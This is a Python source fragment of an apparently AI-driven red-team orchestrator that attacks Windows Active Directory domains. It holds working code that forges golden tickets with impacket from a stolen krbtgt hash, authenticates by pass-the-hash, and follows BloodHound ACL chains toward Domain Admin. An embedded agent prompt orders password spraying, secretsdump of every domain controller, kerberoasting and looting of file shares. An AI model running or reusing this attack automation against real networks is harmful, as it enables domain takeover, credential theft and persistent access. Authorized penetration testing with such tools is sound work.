                        f"🎫 Auto-golden-ticket: No password or hash credential available for SID lookup "
                        f"in {domain}, skipping golden ticket (will retry)"
                    )
                    continue

                # Find DC IP for this domain using dispatcher's robust lookup
                # This handles child domains, forest DCs, DNS SRV, etc.
                dc_ip = dispatcher._find_domain_controller_ip(domain)

                if not dc_ip:
                    logger.warning(f"🎫 Auto-golden-ticket: No DC IP found for {domain}, skipping")
                    # Add failed attempt to state so we don't retry forever
                    state.add_golden_ticket(
                        {
                            "domain": domain,
                            "ticket_path": None,
                            "created_at": datetime.now(timezone.utc).isoformat(),
                            "status": "failed_no_dc",
                        }
                    )
                    # Update processed_domains to prevent duplicate attempts in this iteration
                    processed_domains.add(domain.lower())
                    continue

                # Run lookupsid to get domain SID (with retry for transient errors)
                try:
                    from tenacity import RetryError

                    from ares.tools.red.common import run_tool

                    if cred:
                        # Password-based auth
                        cmd = [
                            "impacket-lookupsid",
                            f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
                        ]
                        logger.info(
                            f"🎫 Auto-golden-ticket: Running lookupsid with password for "
                            f"{cred.domain}\\{cred.username}"
                        )
                    else:
                        # Hash-based auth (pass-the-hash)
                        # Format: domain/user@target -hashes LMHASH:NTHASH
                        # Extract just the NT hash if full LM:NT format
                        # Note: auth_hash is guaranteed non-None here because we checked
                        # `if not cred and not auth_hash: continue` above
                        assert auth_hash is not None  # noqa: S101
                        nt_hash = auth_hash.hash_value
                        if ":" in nt_hash:
                            nt_hash = nt_hash.split(":")[-1]
                        cmd = [
                            "impacket-lookupsid",
                            f"{auth_hash.domain}/{auth_hash.username}@{dc_ip}",
                            "-hashes",
                            f":{nt_hash}",  # Empty LM hash, just NT hash
                        ]
                        logger.info(
                            f"🎫 Auto-golden-ticket: Running lookupsid with hash (PTH) for "
                            f"{auth_hash.domain}\\{auth_hash.username}"
                        )

                    # Use retry wrapper for lookupsid - handles Redis timeouts gracefully
                    try:
                        stdout, stderr, _ = _run_lookupsid_with_retry(cmd, timeout_seconds=60)
                    except (TransientToolError, RetryError) as e:
                        # All retries exhausted due to transient errors (Redis timeout, network)
                        # Don't mark as permanently failed - allow retry on next check interval
                        logger.warning(
                            f"🎫 Auto-golden-ticket: Transient errors for {domain} after retries, "
                            f"will retry next interval: {e}"
                        )
                        # Don't add to processed_domains - allow retry on next iteration
                        continue

                    output = stdout + "\n" + (stderr or "")

                    # Parse domain SID from output
                    sid_match = re.search(r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output)
                    if not sid_match:
                        # Lookupsid ran but couldn't extract SID - this is a permanent failure
                        # (bad creds, wrong domain, etc.)
                        logger.warning(
                            f"🎫 Auto-golden-ticket: Could not extract domain SID for {domain}"
                        )
                        state.add_golden_ticket(
                            {
                                "domain": domain,
                                "ticket_path": None,
                                "created_at": datetime.now(timezone.utc).isoformat(),
                                "status": "failed_no_sid",
                                "error": output[:500]
                                if output.strip()
                                else "No output from lookupsid",
                            }
                        )
                        # Update processed_domains to prevent duplicate attempts in this iteration
                        processed_domains.add(domain.lower())
                        continue

                    domain_sid = sid_match.group(1)
                    logger.info(f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}")

                    # Generate golden ticket
                    ticket_path = "Administrator.ccache"
                    cmd = [
                        "impacket-ticketer",
                        "-nthash",
                        hash_obj.hash_value,
                        "-domain-sid",
                        domain_sid,
                        "-domain",
                        domain,
                        "-user-id",
                        "500",
                        "Administrator",
                    ]
                    stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
                    output = stdout + "\n" + (stderr or "")

                    if returncode == 0 or "Saving ticket" in output:
                        logger.success(
                            f"🎫 GOLDEN TICKET GENERATED for {domain}!\n"
                            f"→ Ticket saved as {ticket_path}\n"
                            f"→ Use: export KRB5CCNAME={ticket_path}\n"
                            f"→ Then: psexec.py -k -no-pass dc.{domain}"
                        )

                        # Announce golden ticket - this sets has_golden_ticket, checkpoints,
                        # and marks operation complete if stop_on_golden_ticket is enabled
                        await dispatcher.announce_golden_ticket(
                            domain=domain,
                            krbtgt_hash=hash_obj.hash_value,
                            ticket_path=ticket_path,
                            source_agent="auto_golden_ticket",
                        )

                        # Store ticket details in state (persisted to Redis!)
                        state.add_golden_ticket(
                            {
                                "domain": domain,
                                "ticket_path": ticket_path,
                                "domain_sid": domain_sid,
                                "krbtgt_hash": hash_obj.hash_value,
                                "created_at": datetime.now(timezone.utc).isoformat(),
                                "status": "success",
                            }
                        )
                        # Update processed_domains to prevent duplicate attempts in this iteration
                        processed_domains.add(domain.lower())

                        # Add to state timeline
                        from ares.core.models import TimelineEvent

                        timeline_event = TimelineEvent(
                            id=f"golden-ticket-{domain.replace('.', '-')}",
                            timestamp=datetime.now(timezone.utc),
                            source="auto_golden_ticket",
                            description=f"Golden ticket generated for {domain} Administrator",
                            mitre_techniques=["T1558.001"],
                            confidence=1.0,
                        )
                        state.operation_timeline.append(timeline_event)

                        # Persist timeline event to Redis
                        backend = getattr(state, "_backend", None)
                        if backend:
                            event_dict = {
                                "id": timeline_event.id,
                                "timestamp": timeline_event.timestamp.isoformat(),
                                "description": timeline_event.description,
                                "evidence_ids": timeline_event.evidence_ids,
                                "mitre_techniques": timeline_event.mitre_techniques,
                                "confidence": timeline_event.confidence,
                                "source": timeline_event.source,
                            }
                            await backend.add_timeline_event(event_dict)
                    else:
                        logger.warning(
                            f"🎫 Auto-golden-ticket: Failed to generate ticket for {domain}: {output}"
                        )
                        state.add_golden_ticket(
                            {
                                "domain": domain,
                                "ticket_path": None,
                                "created_at": datetime.now(timezone.utc).isoformat(),
                                "status": "failed_ticketer",
                                "error": output[:500],
                            }
                        )
                        # Update processed_domains to prevent duplicate attempts in this iteration
                        processed_domains.add(domain.lower())

                except Exception as e:
                    logger.warning(f"🎫 Auto-golden-ticket: Error generating ticket: {e}")
                    state.add_golden_ticket(
                        {
                            "domain": domain,
                            "ticket_path": None,
                            "created_at": datetime.now(timezone.utc).isoformat(),
                            "status": "failed_exception",
                            "error": str(e)[:500],
                        }
                    )
                    # Update processed_domains to prevent duplicate attempts in this iteration
                    processed_domains.add(domain.lower())

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto golden ticket error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_acl_chain_follow(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Automatically follow ACL chains discovered by BloodHound.

    When BloodHound discovers multi-hop ACL paths to Domain Admin,
    this automation:
    1. Tracks chain progress
    2. Dispatches tasks for each step
    3. Re-authenticates with new credentials
    4. Continues until DA is achieved

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between chain progress checks
    """
    from ares.core.dispatcher.acl_chains import ACLChainTracker

    state = dispatcher.shared_state

    # Initialize tracker if not present (with state for persistence!)
    if not hasattr(dispatcher, "_acl_chain_tracker"):
        dispatcher._acl_chain_tracker = ACLChainTracker(state=state)
    elif dispatcher._acl_chain_tracker._state is None:
        dispatcher._acl_chain_tracker.set_state(state)

    tracker: ACLChainTracker = dispatcher._acl_chain_tracker

    while True:
        try:
            await asyncio.sleep(check_interval)

            # Re-read state each iteration for latest tracking
            state = dispatcher.shared_state

            # Skip if DA already achieved
            if state.has_domain_admin:
                continue

            # Check for chains that need progress
            for chain in list(tracker.chains.values()):
                if chain.is_complete:
                    continue

                current_step = chain.current_step
                if not current_step:
                    continue

                step_key = f"{chain.chain_id}:{current_step.step_id}"
                if step_key in state.dispatched_acl_steps:
                    continue

                # Check if we have credentials for the source user
                source_cred = None
                for cred in state.all_credentials:
                    if cred.username.lower() == current_step.source.lower() and cred.password:
                        source_cred = cred
                        break

                if not source_cred:
                    # Check if previous step provided a credential
                    if chain.current_step_index > 0:
                        prev_step = chain.steps[chain.current_step_index - 1]
                        if prev_step.new_credential:
                            # Create credential from previous step
                            from ares.core.models import Credential

                            source_cred = Credential(
                                username=prev_step.new_credential.get("username", ""),
                                password=prev_step.new_credential.get("password", ""),
                                domain=chain.domain,
                                source="acl_chain",
                            )
                    else:
                        logger.debug(
                            f"🔗 ACL chain {chain.chain_id}: No credentials for source {current_step.source}"
                        )
                        continue

                # Generate prompt for this step
                prompt = tracker.generate_step_prompt(chain, current_step, chain.domain)

                logger.info(
                    f"🔗 ACL chain {chain.chain_id} step {current_step.step_id}: "
                    f"{current_step.source} -> {current_step.target} ({current_step.action.value})"
                )

                # Dispatch to ACL agent
                if source_cred is None:  # Should never happen due to continue above
                    continue
                try:
                    task_id = await dispatcher.dispatch_task(
                        agent_role="acl",
                        task_type="acl_chain_step",
                        description=f"ACL chain step: {current_step.source} -> {current_step.target}",
                        payload={
                            "chain_id": chain.chain_id,
                            "step_id": current_step.step_id,
                            "source": current_step.source,
                            "target": current_step.target,
                            "right": current_step.right,
                            "action": current_step.action.value,
                            "domain": chain.domain,
                            "username": source_cred.username,
                            "password": source_cred.password,
                            "prompt": prompt,
                        },
                    )
                    state.dispatched_acl_steps.add(step_key)
                    logger.info(f"Dispatched ACL chain step: {task_id}")
                except Exception as e:
                    logger.warning(f"🔗 Failed to dispatch ACL chain step: {e}")

            # Check for newly discovered chains from BloodHound output
            # (This is handled in result_processing via extract_acl_chains_from_bloodhound)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto ACL chain error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


def _get_running_crack_tasks(dispatcher: RedTeamDispatcher) -> list[str]:
    """Get task IDs for crack tasks that are still pending (running)."""
    crack_task_ids = []
    for task_id, task_info in dispatcher.shared_state.pending_tasks.items():
        if task_info.task_type == "crack":
            crack_task_ids.append(task_id)
    return crack_task_ids


async def _wait_for_loot_collection(
    dispatcher: RedTeamDispatcher,
    grace_period: float = 60.0,
    check_interval: float = 5.0,
) -> None:
    """
    Wait for loot collection tasks (share spider, etc.) after DA is achieved.

    When DA is achieved quickly, share spidering and other credential collection
    may not have completed. This gives background tasks time to finish.

    Args:
        dispatcher: The dispatcher instance
        grace_period: Seconds to wait for loot collection
        check_interval: Seconds between status logs
    """
    state = dispatcher.shared_state
    initial_creds = len(state.all_credentials)
    initial_hashes = len(state.all_hashes)
    shares_to_spider = [
        s
        for s in state.all_shares
        if s.permissions
        and "READ" in s.permissions.upper()
        and s.name.lower() not in ("ipc$", "print$", "admin$", "c$", "d$", "e$")
    ]

    if not shares_to_spider:
        logger.debug("No readable shares to spider, skipping loot collection wait")
        return

    logger.info(
        f"🕷️ Post-DA loot collection: {len(shares_to_spider)} readable share(s), "
        f"waiting up to {grace_period}s for share spidering..."
    )

    start_time = asyncio.get_event_loop().time()

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed >= grace_period:
            new_creds = len(state.all_credentials) - initial_creds
            new_hashes = len(state.all_hashes) - initial_hashes
            logger.info(
                f"🕷️ Loot collection complete: +{new_creds} credentials, +{new_hashes} hashes"
            )
            break

        await asyncio.sleep(check_interval)


async def _wait_for_crack_tasks(
    dispatcher: RedTeamDispatcher,
    timeout: float | None = None,
    check_interval: float = 5.0,
) -> None:
    """
    Wait for running crack tasks to complete with a timeout.

    Args:
        dispatcher: The dispatcher instance
        timeout: Maximum seconds to wait for crack tasks (default from config)
        check_interval: Seconds between checks
    """
    if timeout is None:
        timeout = get_crack_task_grace_period()
    start_time = asyncio.get_event_loop().time()
    crack_tasks = _get_running_crack_tasks(dispatcher)

    if not crack_tasks:
        logger.debug("No running crack tasks to wait for")
        return

    logger.info(
        f"Waiting for {len(crack_tasks)} running crack task(s) to complete "
        f"(grace period: {timeout}s)"
    )

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed > timeout:
            remaining = _get_running_crack_tasks(dispatcher)
            if remaining:
                logger.warning(
                    f"Crack task grace period expired with {len(remaining)} task(s) "
                    f"still running: {remaining}"
                )
            break

        remaining = _get_running_crack_tasks(dispatcher)
        if not remaining:
            logger.success("All crack tasks completed within grace period")
            break

        logger.debug(
            f"Waiting for {len(remaining)} crack task(s): {remaining} "
            f"({elapsed:.0f}s/{timeout:.0f}s elapsed)"
        )
        await asyncio.sleep(check_interval)


async def _wait_for_golden_ticket(
    dispatcher: RedTeamDispatcher,
    timeout: float = 120.0,
    check_interval: float = 5.0,
) -> None:
    """
    Wait for golden ticket generation if krbtgt hash is available.

    When DA is achieved, we may have a krbtgt hash that the _auto_golden_ticket
    background task hasn't processed yet. This function waits for golden ticket
    generation to complete (or timeout) before exiting.

    Args:
        dispatcher: The dispatcher instance
        timeout: Maximum seconds to wait for golden ticket
        check_interval: Seconds between checks
    """
    state = dispatcher.shared_state

    # Find krbtgt hashes that don't have corresponding golden tickets yet
    processed_domains = {
        t.get("domain", "").lower()
        for t in state.golden_tickets
        if t.get("domain")
        and t.get("status") in ("success", "failed_no_dc", "failed_no_sid", "failed_ticketer")
    }

    pending_krbtgt_domains = set()
    for hash_obj in state.all_hashes:
        if hash_obj.username.lower() == "krbtgt" and hash_obj.hash_type.lower() == "ntlm":
            domain = (hash_obj.domain or "").lower()
            if domain and domain not in processed_domains:
                pending_krbtgt_domains.add(domain)

    if not pending_krbtgt_domains:
        if state.has_golden_ticket:
            logger.info("🎫 Golden ticket already generated")
        return

    logger.info(
        f"🎫 Waiting for golden ticket generation for {len(pending_krbtgt_domains)} domain(s): "
        f"{pending_krbtgt_domains} (timeout: {timeout}s)"
    )

    start_time = asyncio.get_event_loop().time()

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed > timeout:
            logger.warning(
                f"🎫 Golden ticket generation timed out after {timeout}s. "
                f"Pending domains: {pending_krbtgt_domains}"
            )
            break

        # Check if golden ticket was generated
        if state.has_golden_ticket:
            logger.success("🎫 Golden ticket generated successfully!")
            break

        # Check if all pending domains have been processed (success or failure)
        processed_domains = {
            t.get("domain", "").lower()
            for t in state.golden_tickets
            if t.get("domain")
            and t.get("status") in ("success", "failed_no_dc", "failed_no_sid", "failed_ticketer")
        }
        remaining = pending_krbtgt_domains - processed_domains
        if not remaining:
            if state.has_golden_ticket:
                logger.success("🎫 Golden ticket generated successfully!")
            else:
                logger.warning("🎫 All golden ticket attempts completed (some may have failed)")
            break

        logger.debug(
            f"🎫 Waiting for golden ticket ({elapsed:.0f}s/{timeout:.0f}s) - pending: {remaining}"
        )
        await asyncio.sleep(check_interval)


async def _wait_for_completion(
    dispatcher: RedTeamDispatcher,
    background_tasks: list[asyncio.Task],
    max_runtime: float = 7200.0,
    check_interval: float = 10.0,
) -> None:
    """
    Wait for operation completion or domain admin achievement.

    Args:
        dispatcher: The dispatcher instance
        background_tasks: Background tasks to monitor
        max_runtime: Maximum runtime in seconds
        check_interval: Seconds between completion checks
    """
    start_time = asyncio.get_event_loop().time()

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        # Check runtime limit
        if elapsed > max_runtime:
            logger.warning(f"Operation reached max runtime ({max_runtime}s)")
            # Still try for golden ticket if we have krbtgt (quick operation)
            await _wait_for_golden_ticket(dispatcher, timeout=60.0)
            # Wait for running crack tasks before fully exiting
            await _wait_for_crack_tasks(dispatcher)
            break

        # Check for domain admin or explicit completion
        if dispatcher.shared_state.has_domain_admin:
            from ares.core.config import get_stop_on_golden_ticket

            if get_stop_on_golden_ticket():
                logger.success("Domain Admin achieved! Continuing to forge golden ticket...")
            else:
                logger.success("Domain Admin achieved! Operation complete.")
            # Wait for loot collection (share spider, etc.) while background tasks are still running
            await _wait_for_loot_collection(dispatcher)
            # Wait for golden ticket generation (if krbtgt hash is available)
            await _wait_for_golden_ticket(dispatcher)
            # Wait for running crack tasks before fully exiting
            await _wait_for_crack_tasks(dispatcher)
            break
        if dispatcher.shared_state.completed:
            logger.success("Operation marked complete.")
            # Wait for golden ticket generation (if krbtgt hash is available)
            await _wait_for_golden_ticket(dispatcher)
            # Wait for running crack tasks before fully exiting
            await _wait_for_crack_tasks(dispatcher)
            break

        # Check for failed background tasks
        for task in background_tasks:
            if task.done() and not task.cancelled():
                exc = task.exception()
                if exc:
                    logger.error(f"Background task {task.get_name()} failed: {exc}")

        await asyncio.sleep(check_interval)


def _build_orchestrator_prompt(
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None = None,
) -> str:
    """
    Build the initial prompt for the orchestrator agent.

    Args:
        target_domain: Target domain
        target_ips: Target IPs
        initial_credential: Initial credential if available

    Returns:
        Formatted prompt string
    """
    cred_info = "None (start with unauthenticated recon)"
    if initial_credential:
        cred_info = f"{initial_credential.domain}\\{initial_credential.username}"

    return f"""Begin red team operation for {target_domain}.

Target IPs: {", ".join(target_ips)}
Initial credential: {cred_info}

Your objectives:
1. Run nmap_scan on all targets to discover services (ONCE - do NOT re-scan targets that have already been scanned)
2. **Run smb_sweep on all targets** - This captures Windows OS versions, FQDNs, and domain membership (CRITICAL for host identification)
3. **MULTI-DOMAIN SETUP (run early with first credential!):**
   - enumerate_domain_netbios_mappings: Query AD for NetBIOS->FQDN domain mappings
   - This ensures credentials from child domains resolve correctly (e.g., CORP -> corp.contoso.local)
4. LOW-HANGING FRUIT (do these early!):
   - ldap_search_descriptions: Find passwords stored in user description fields
   - password_spray with common passwords (Password1, Welcome1, Summer2024, Company123, Qwerty123, Passw0rd!, LetMeIn1)
   - username_as_password: Test if users have username as password (e.g., user1:user1)
5. Enumerate users and shares with netexec/enum4linux-ng/rpcclient/smbclient
6. If no creds, run Kerberos user recon with kerberos_user_enum_noauth
7. Run certipy_find to discover ADCS vulnerabilities
8. Run run_bloodhound for ACL analysis and attack path discovery
9. **CRITICAL CREDENTIAL EXPANSION (run IMMEDIATELY after finding ANY credentials):**
   - Use secretsdump on ALL domain controllers to dump hashes
   - Use kerberoast to find service accounts with weak passwords
   - Use asrep_roast to find accounts without Kerberos pre-auth
   - Check secretsdump output for krbtgt or Administrator hashes
   - If krbtgt hash found → Generate golden ticket → Announce Domain Admin
   - If Administrator hash found → Test DA access → Announce Domain Admin
10. Coordinate with specialized agents to exploit discovered vulnerabilities
11. Use trigger_credential_expansion after getting new credentials
12. Continue until Domain Admin access achieved

Priority vulnerabilities to look for:
- Passwords in LDAP description fields (QUICK WIN - check first!)
- Username=password combinations (QUICK WIN)
- Weak/common passwords via spraying (QUICK WIN)
- **krbtgt hash via secretsdump (HIGHEST PRIORITY - instant DA)**
- **Administrator hash via secretsdump (VERY HIGH PRIORITY)**
- ADCS ESC1-ESC8
- Kerberoastable accounts
- AS-REP roastable accounts
- Unconstrained/Constrained delegation
- ACL abuse paths (GenericAll, WriteDACL, etc.)
- MSSQL linked servers

CRITICAL WORKFLOW AFTER FINDING CREDENTIALS:
1. Run secretsdump against all DCs immediately
2. Run kerberoast and asrep_roast with the credentials
3. Look for krbtgt or Administrator in secretsdump output
4. Crack any discovered hashes with dispatch_crack_hash
5. Test new credentials and repeat steps 1-4

Remember:
- Use dispatch_* tools to route tasks to specialized agents
- Use queue_vulnerability_for_exploitation to queue discovered vulnerabilities
- Use trigger_credential_expansion after finding new credentials
- **ALWAYS run secretsdump after finding ANY credentials**
- Monitor progress with get_operation_summary
- Announce domain admin when achieved with announce_domain_admin

IMPORTANT - Avoid polling loops:
- Do NOT repeatedly call get_pending_tasks or get_exploitation_status without taking action
- If tasks are pending, wait for results OR dispatch new tasks - don't just keep checking status
- Only check status after taking an action or after significant time has passed
- Each step should make progress (dispatch task, exploit vuln, expand creds) - not just observe

Let's begin the operation!
"""


__all__ = [
    "run_multi_agent_operation",
]
